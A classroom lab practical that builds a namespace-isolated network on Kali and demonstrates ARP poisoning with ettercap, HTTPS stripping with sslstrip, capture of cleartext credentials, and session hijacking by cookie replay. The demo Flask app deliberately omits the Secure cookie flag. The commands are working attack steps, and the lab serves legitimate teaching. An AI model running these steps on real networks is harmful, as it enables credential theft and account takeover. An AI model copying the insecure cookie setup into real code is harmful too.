# Practical 04: HTTPS Stripping, MITM Traffic Interception, and Session Hijacking

**Aim:** To understand and demonstrate HTTPS stripping, Man-in-the-Middle (MITM)
network traffic interception, and cookie-based session hijacking in a
controlled, local laboratory environment.

**Environment:** Kali Linux, single physical machine, no Docker/VMs/containers.
The three roles (victim, attacker, router) are simulated using **Linux
network namespaces** (`ip netns`) — a native kernel feature exposed by
`iproute2`, which ships with Kali by default. This gives you real, separate
L2/L3 stacks (so ARP spoofing behaves exactly like it would between two
physical hosts) without installing any virtualization software.

**Scope / Ethics:** Every namespace lives inside your own machine, under your
own root account. Nothing here touches a real third-party network or site.
Do not reuse these techniques outside a lab you own and are authorized to
test.

---

## 1. Architecture

```
            host default namespace
          ┌─────────────────────────┐
          │   bridge "br0" (switch) │
          └───┬───────────┬─────────┘
   veth-victim-br   veth-attacker-br   veth-router-br
       │                 │                  │
┌──────┴─────┐   ┌───────┴──────┐   ┌───────┴──────┐
│ netns:     │   │ netns:       │   │ netns:       │
│ victim     │   │ attacker     │   │ router       │
│172.20.0.10 │   │172.20.0.20   │   │172.20.0.1    │
│ (curl)     │   │ ettercap,    │   │ (Flask demo  │
│            │   │ sslstrip,    │   │  app, HTTPS) │
│            │   │ tshark       │   │              │
└────────────┘   └──────────────┘   └──────────────┘
```

- `br0` is a software Ethernet switch living in your normal (root) namespace.
- Each role gets its own network namespace with one veth leg plugged into
  `br0` — electrically equivalent to three separate PCs on the same switch.
- `router` doubles as both "gateway" and "web server" to keep the topology
  minimal — same logic as a real router hosting a captive site.
- `attacker` ARP-poisons `victim` so victim's traffic to the gateway actually
  flows through `attacker` first — then `sslstrip` on `attacker` strips the
  HTTPS down to HTTP in transit, and `tshark`/Wireshark capture the result.

---

## 2. Prerequisites

Kali ships these already; if anything's missing:

```bash
sudo apt update
sudo apt install -y iproute2 bridge-utils ettercap-text-only sslstrip \
                     tshark wireshark curl iptables python3-flask openssl
```

(`iproute2`/`bridge-utils` are core OS networking tools, not an added
"application" — they're what `ip netns`, `ip link`, veths, and bridges run
on.)

---

## 3. Build the namespace topology

All on the host, as root. Run this once to stand up the lab:

```bash
# 1. Create the three namespaces
sudo ip netns add victim
sudo ip netns add attacker
sudo ip netns add router

# 2. Create the virtual switch
sudo ip link add br0 type bridge
sudo ip link set br0 up

# 3. Create one veth pair per namespace
sudo ip link add veth-victim   type veth peer name veth-victim-br
sudo ip link add veth-attacker type veth peer name veth-attacker-br
sudo ip link add veth-router   type veth peer name veth-router-br

# 4. Move one end of each pair into its namespace
sudo ip link set veth-victim   netns victim
sudo ip link set veth-attacker netns attacker
sudo ip link set veth-router   netns router

# 5. Plug the other ends into the bridge and bring them up
for i in victim attacker router; do
  sudo ip link set veth-$i-br master br0
  sudo ip link set veth-$i-br up
done

# 6. Configure each namespace's interface, IP, and loopback
sudo ip netns exec victim   ip addr add 172.20.0.10/24 dev veth-victim
sudo ip netns exec victim   ip link set veth-victim up
sudo ip netns exec victim   ip link set lo up
sudo ip netns exec victim   ip route add default via 172.20.0.1

sudo ip netns exec attacker ip addr add 172.20.0.20/24 dev veth-attacker
sudo ip netns exec attacker ip link set veth-attacker up
sudo ip netns exec attacker ip link set lo up

sudo ip netns exec router   ip addr add 172.20.0.1/24 dev veth-router
sudo ip netns exec router   ip link set veth-router up
sudo ip netns exec router   ip link set lo up
```

**Sanity check** — ping across the simulated LAN:

```bash
sudo ip netns exec victim ping -c 2 172.20.0.1
```

---

## 4. Build the demo target app (runs in the `router` namespace)

A minimal Flask app with a login form and a session cookie, served over
**HTTPS with a self-signed cert** — this is what `sslstrip` will downgrade.

```bash
mkdir -p ~/pentest-lab && cd ~/pentest-lab

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
  -days 365 -nodes -subj "/CN=lab.local"
```

**`~/pentest-lab/app.py`**
```python
from flask import Flask, request, redirect, make_response
import secrets

app = Flask(__name__)
SESSIONS = {}  # token -> username   (toy in-memory session store)

LOGIN_PAGE = """
<form method="POST" action="/login">
  <input name="username" placeholder="username">
  <input name="password" type="password" placeholder="password">
  <button type="submit">Log in</button>
</form>
"""

@app.route("/")
def index():
    token = request.cookies.get("session_id")
    if token in SESSIONS:
        return f"<h1>Welcome back, {SESSIONS[token]}!</h1><p>This is the protected dashboard.</p>"
    return LOGIN_PAGE

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("username")
    pwd = request.form.get("password")
    if user == "alice" and pwd == "password123":   # toy auth check
        token = secrets.token_hex(16)
        SESSIONS[token] = user
        resp = make_response(redirect("/"))
        # NOTE: no 'Secure' flag set here on purpose, for the practical.
        resp.set_cookie("session_id", token, httponly=False)
        return resp
    return "Login failed", 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"))
```

Run it **inside the `router` namespace** so it's only reachable at
`172.20.0.1`, not on your real host IP:

```bash
sudo ip netns exec router python3 ~/pentest-lab/app.py
```

Leave this running in its own terminal.

> This app mirrors a common real-world mistake: HTTPS is offered, but the
> session cookie isn't marked `Secure`, so it will happily travel over plain
> HTTP too if an attacker forces a downgrade. That's the vulnerability you're
> demonstrating.

---

## 5. Step 1 — Baseline: confirm HTTPS works normally

In a new terminal:

```bash
sudo ip netns exec victim curl -k -v https://172.20.0.1/
```

You should see a normal TLS handshake and the login page HTML. Confirm this
"before" state before touching anything.

---

## 6. Step 2 — Enable IP forwarding and ARP spoofing on the attacker

```bash
sudo ip netns exec attacker sysctl -w net.ipv4.ip_forward=1
```

Start `ettercap` inside the attacker namespace to ARP-poison the victim,
redirecting its gateway-bound traffic through the attacker instead:

```bash
sudo ip netns exec attacker \
  ettercap -T -q -i veth-attacker -M arp:remote /172.20.0.10// /172.20.0.1//
```

Leave this running. In another terminal, **verify** the victim's ARP cache
now (incorrectly) maps the gateway to the attacker's MAC:

```bash
sudo ip netns exec victim ip neigh show
sudo ip netns exec attacker ip link show veth-attacker   # compare MACs
```

The MAC shown for `172.20.0.1` in the victim's neighbor table should now
match the attacker's interface MAC, not the router's.

---

## 7. Step 3 — HTTPS stripping with sslstrip

`sslstrip` transparently proxies HTTP, rewriting `https://` links in HTML to
`http://` before they reach the victim, so the victim's *next* request goes
out in cleartext — while sslstrip talks TLS to the real server on the
victim's behalf. Each namespace has its own independent netfilter tables, so
these `iptables` rules apply only inside `attacker`:

```bash
sudo ip netns exec attacker iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 10000
sudo ip netns exec attacker iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000

sudo ip netns exec attacker sslstrip -l 10000 -w ~/pentest-lab/sslstrip.log
```

Leave this running in its own terminal.

---

## 8. Step 4 — Capture traffic with Wireshark/tshark

Capture on the attacker's interface, where the poisoned traffic actually
arrives:

```bash
sudo ip netns exec attacker tshark -i veth-attacker \
  -f "tcp port 80 or tcp port 443" -w ~/pentest-lab/capture.pcap
```

Since the pcap is written straight to your normal filesystem, you can open
it directly in the Wireshark GUI afterwards (no copy step needed, since this
is all one machine):

```bash
wireshark ~/pentest-lab/capture.pcap
```

---

## 9. Step 5 — Trigger the victim's login over the poisoned path

Simulate the victim logging in. Point at plain HTTP, representing "what the
browser now does after sslstrip rewrote the link":

```bash
sudo ip netns exec victim curl -v -L http://172.20.0.1/ \
  -d "username=alice&password=password123" -X POST --path-as-is \
  -c /tmp/victim_cookies.txt
cat /tmp/victim_cookies.txt
```

Because the gateway is poisoned, this request transits the attacker first.
In the capture/`sslstrip.log` you should now see:

- The `POST /login` request in **cleartext HTTP**, containing
  `username=alice&password=password123`.
- The server's `Set-Cookie: session_id=<token>` response header, also in
  cleartext.

This is the core evidence for your report: credentials and session tokens
that should have been TLS-protected are visible on the wire because of the
downgrade.

---

## 10. Step 6 — Session hijacking with the stolen cookie

Extract the `session_id` value from the capture (Wireshark filter:
`http.cookie or http.set_cookie`) or from `sslstrip.log` /
`/tmp/victim_cookies.txt`.

Now, **from the attacker namespace**, replay that cookie as if you were the
victim — no credentials needed, only the stolen token:

```bash
sudo ip netns exec attacker curl -v http://172.20.0.1/ \
  -H "Cookie: session_id=<stolen_token>"
```

Expected result: the response shows `"Welcome back, alice!"` — the attacker
is now inside the victim's authenticated session purely by replaying the
captured cookie. This demonstrates session hijacking.

---

## 11. Cleanup

Stop `ettercap`, `sslstrip`, `tshark`, and the Flask app (Ctrl-C in each
terminal), then tear down the virtual topology:

```bash
sudo ip netns del victim
sudo ip netns del attacker
sudo ip netns del router
sudo ip link del br0
```

(Deleting a namespace automatically removes its half of each veth pair; the
bridge-side legs disappear along with `br0`.)

---

## 12. What to put in your lab report

1. **Packet captures**: screenshots from Wireshark showing the cleartext
   `POST /login` body and the `Set-Cookie` header.
2. **ARP evidence**: `ip neigh show` output on the victim before and after
   poisoning, showing the gateway's MAC address changed to the attacker's.
3. **sslstrip log**: excerpt showing the captured credentials.
4. **Hijack proof**: the `curl` response showing the attacker accessed
   `"Welcome back, alice!"` using only the stolen cookie, never the password.
5. **Analysis** — tie each step back to *why* it worked:
   - ARP has no authentication → spoofable (Step 2).
   - No HSTS / no forced HTTPS redirect → stripping possible (Step 3).
   - Cookie missing `Secure`/`HttpOnly`/`SameSite` → it crosses to plain HTTP
     and is readable in transit (Steps 3–5).
6. **Mitigations** (discuss each):
   - `Strict-Transport-Security` (HSTS) header, so browsers refuse to
     downgrade to HTTP for this host.
   - `Secure` + `HttpOnly` + `SameSite` cookie flags.
   - Static ARP entries / Dynamic ARP Inspection / 802.1X on real switches,
     to blunt ARP spoofing on production LANs.
   - Certificate pinning / HSTS preload lists for browsers.

---

## 13. Troubleshooting notes

- `ip netns exec <ns> <cmd>` runs `<cmd>` inside that namespace's network
  stack but shares your real filesystem — that's why the Flask app, pcap,
  and log files are all just normal files under `~/pentest-lab/`.
- If `ettercap` can't resolve a target, double-check all three veth-*-br legs
  show `UP` and are attached to `br0`: `ip link show master br0`.
- `net.ipv4.ip_forward` and iptables tables are namespace-scoped on modern
  Linux kernels, so Step 2/3's settings only affect the `attacker` namespace
  — they won't touch your real host's forwarding/firewall state.
- `curl -k` is used only for the baseline HTTPS check in Step 5 (self-signed
  cert). Once sslstrip is in the path you're deliberately talking the
  downgraded HTTP protocol, so `-k` doesn't apply there.
- To re-run the whole lab, do the cleanup in Section 11 first — reusing
  namespace/bridge names without deleting them will error out.
